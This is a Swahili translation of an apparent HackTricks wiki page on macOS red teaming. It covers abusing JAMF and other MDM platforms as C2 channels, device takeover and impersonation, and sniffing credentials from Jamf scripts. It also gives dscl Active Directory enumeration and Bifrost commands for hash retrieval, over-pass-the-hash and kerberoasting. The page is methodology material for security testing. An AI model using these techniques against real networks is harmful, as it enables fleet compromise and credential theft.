# Red Teaming ya macOS

{{#include ../../banners/hacktricks-training.md}}


## Kutumia vibaya MDMs

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Ikiwa utaweza **ku-compromise credentials za admin** ili kufikia management platform, unaweza **kumpromise computers zote** kwa kusambaza malware yako kwenye mashine hizo.

Kwa red teaming katika mazingira ya MacOS, inashauriwa sana kuwa na uelewa fulani wa jinsi MDMs zinavyofanya kazi:


{{#ref}}
macos-mdm/
{{#endref}}

### Kutumia MDM kama C2

MDM itakuwa na ruhusa ya kusakinisha, kuuliza au kuondoa profiles, kusakinisha applications, kuunda local admin accounts, kuweka firmware password, kubadilisha FileVault key...

Ili kuendesha MDM yako mwenyewe, unahitaji **CSR yako isainiwe na vendor**, jambo ambalo unaweza kujaribu kulipata kupitia [**https://mdmcert.download/**](https://mdmcert.download/). Na ili kuendesha MDM yako mwenyewe kwa Apple devices, unaweza kutumia [**MicroMDM**](https://github.com/micromdm/micromdm).

Hata hivyo, ili kusakinisha application kwenye enrolled device, bado inahitaji kusainiwa na developer account... hata hivyo, wakati wa MDM enrolment **device huongeza SSL cert ya MDM kama trusted CA**, hivyo sasa unaweza kusaini chochote.<sup>[4]</sup>

Ili ku-enrol device kwenye MDM, unahitaji kusakinisha **`mobileconfig`** file kama root, ambayo inaweza kuwasilishwa kupitia **pkg** file (unaweza ku-compress kwenye zip na inapopakuliwa kutoka Safari itadecompress).

**Mythic agent Orthrus** hutumia technique hii.

### Kutumia vibaya JAMF PRO

JAMF inaweza kuendesha **custom scripts** (scripts zilizotengenezwa na sysadmin), **native payloads** (local account creation, set EFI password, file/process monitoring...) na **MDM** (device configurations, device certificates...).<sup>[5]</sup>

#### JAMF self-enrolment

Nenda kwenye ukurasa kama `https://<company-name>.jamfcloud.com/enroll/` ili kuona kama wana **self-enrolment enabled**. Ikiwa wanayo, inaweza **kuomba credentials za kufikia**.

Unaweza kutumia script [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) kufanya password spraying attack.

Zaidi ya hayo, baada ya kupata credentials sahihi unaweza kuweza brute-force usernames nyingine kwa kutumia form ifuatayo:

![Kutumia vibaya JAMF PRO - JAMF self-enrolment: Zaidi ya hayo, baada ya kupata credentials sahihi unaweza kuweza brute-force usernames nyingine kwa kutumia form ifuatayo](<../../images/image (107).png>)

#### JAMF device Authentication

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

Binary ya **`jamf`** ilikuwa na secret ya kufungua keychain ambayo wakati wa discovery ilikuwa **shared** miongoni mwa kila mtu na ilikuwa: **`jk23ucnq91jfu9aj`**.<sup>[5]</sup>\
Zaidi ya hayo, jamf **persist** kama **LaunchDaemon** katika **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### JAMF Device Takeover

**JSS** (Jamf Software Server) **URL** ambayo **`jamf`** itatumia iko katika **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
File hii kimsingi ina URL:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://subdomain-company.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
Kwa hivyo, mshambuliaji angeweza kuweka package hasidi (`pkg`) ambayo **huandika juu ya faili hii** inapowekwa, akiweka **URL ya listener wa Mythic C2 kutoka kwa Typhon agent**, na hivyo kuweza kutumia vibaya JAMF kama C2.
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### JAMF Impersonation

Ili **ku-impersonate mawasiliano** kati ya device na JMF unahitaji:

- **UUID** ya device: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- **JAMF keychain** kutoka: `/Library/Application\ Support/Jamf/JAMF.keychain` ambayo ina device certificate

Kwa kutumia taarifa hizi, **create VM** yenye **stolen** Hardware **UUID** na **SIP disabled**, weka **JAMF keychain**, **hook** Jamf **agent** na uibe taarifa zake.

#### Secrets stealing

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Unaweza pia kufuatilia location `/Library/Application Support/Jamf/tmp/` kwa ajili ya **custom scripts** ambazo admins wanaweza kutaka ku-execute kupitia Jamf, kwa kuwa **huwekwa hapa, hu-execute na huondolewa**. Scripts hizi **zinaweza kuwa na credentials**.

Hata hivyo, **credentials** zinaweza kupitishwa kwenye scripts hizi kama **parameters**, kwa hiyo utahitaji kufuatilia `ps aux | grep -i jamf` (hata bila kuwa root).

Script [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) inaweza kusikiliza files mpya zinapoongezwa na process arguments mpya.

### Remote Access ya macOS

Na pia kuhusu **network** **protocols** "special" za **MacOS**:


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

Katika baadhi ya matukio utagundua kuwa **MacOS computer imeunganishwa kwenye AD**. Katika hali hii unapaswa kujaribu **ku-enumerate** active directory kama ulivyozoea. Pata **help** katika pages zifuatazo:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Baadhi ya **local MacOS tools** ambazo zinaweza pia kukusaidia ni `dscl`:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Pia kuna baadhi ya tools zilizoandaliwa kwa MacOS ili ku-enumerate AD kiotomatiki na kufanya majaribio na kerberos:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound ni extension ya Bloodhound audting tool inayowezesha kukusanya na kuingiza mahusiano ya Active Directory kwenye hosts za MacOS.<sup>[2]</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost ni project ya Objective-C iliyoundwa kuingiliana na Heimdal krb5 APIs kwenye macOS. Lengo la project hii ni kuwezesha security testing bora zaidi kuhusiana na Kerberos kwenye vifaa vya macOS kwa kutumia native APIs bila kuhitaji framework au packages nyingine kwenye target.
- [**Orchard**](https://github.com/its-a-feature/Orchard): Tool ya JavaScript for Automation (JXA) ya kufanya Active Directory enumeration.

### Taarifa za Domain
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Watumiaji

Aina tatu za watumiaji wa MacOS ni:

- **Local Users** — Husimamiwa na huduma ya local OpenDirectory, na hawajaunganishwa kwa njia yoyote na Active Directory.
- **Network Users** — Watumiaji wa Active Directory wa muda ambao wanahitaji muunganisho wa seva ya DC ili kuthibitisha utambulisho.
- **Mobile Users** — Watumiaji wa Active Directory walio na nakala rudufu ya ndani ya credentials na faili zao.

Taarifa za ndani kuhusu watumiaji na groups zimehifadhiwa kwenye folda _/var/db/dslocal/nodes/Default._\
Kwa mfano, taarifa kuhusu mtumiaji aitwaye _mark_ imehifadhiwa kwenye _/var/db/dslocal/nodes/Default/users/mark.plist_ na taarifa kuhusu group _admin_ iko kwenye _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Mbali na kutumia edges za HasSession na AdminTo, **MacHound inaongeza edges tatu mpya** kwenye database ya Bloodhound:<sup>[2]</sup>

- **CanSSH** - entity iliyoruhusiwa kutumia SSH kwenda kwenye host
- **CanVNC** - entity iliyoruhusiwa kutumia VNC kwenda kwenye host
- **CanAE** - entity iliyoruhusiwa kutekeleza AppleEvent scripts kwenye host
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Maelezo zaidi katika [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Nenosiri la Computer$

Pata manenosiri kwa kutumia:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
Inawezekana kufikia **`Computer$`** password ndani ya System keychain.

### Over-Pass-The-Hash

Pata TGT kwa user na service maalum:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Baada ya TGT kukusanywa, inawezekana kuiingiza katika session ya sasa kwa:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Kwa kutumia service tickets zilizopatikana, inawezekana kujaribu kufikia shares kwenye kompyuta nyingine:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Kufikia Keychain

Keychain kwa uwezekano mkubwa ina taarifa nyeti ambazo, ikiwa zitafikiwa bila kuonyesha prompt, zinaweza kusaidia kuendeleza zoezi la red team:


{{#ref}}
macos-keychain.md
{{#endref}}

## Huduma za Nje

MacOS Red Teaming ni tofauti na Windows Red Teaming ya kawaida kwa sababu kwa kawaida **MacOS imeunganishwa moja kwa moja na platforms kadhaa za nje**. Usanidi wa kawaida wa MacOS ni kufikia kompyuta kwa kutumia **credentials zilizosawazishwa na OneLogin, na kufikia huduma kadhaa za nje** (kama github, aws...) kupitia OneLogin.

## Mbinu Mbalimbali za Red Team

### Safari

Faili inapopakuliwa katika Safari, ikiwa ni faili "salama", **hufunguliwa kiotomatiki**. Kwa mfano, uki**pakua zip**, itafunguliwa kiotomatiki:

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## Marejeo

- [1] [Kuchuma Apple: Kuendesha Red Teaming katika Mazingira ya MacOS mwaka 2021 - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Kuanzisha MacHound: Suluhisho la Mashambulizi dhidi ya Active Directory ya macOS](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Amri za Domain Enumeration (sawa na dscl / net / ldapsearch)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Njoo Upande wa Giza, Tuna Apples: Kufanya Usimamizi wa macOS Uwe wa Kichokozi](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: "Mtazamo wa Mshambuliaji kuhusu Usanidi wa Jamf" - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)


{{#include ../../banners/hacktricks-training.md}}
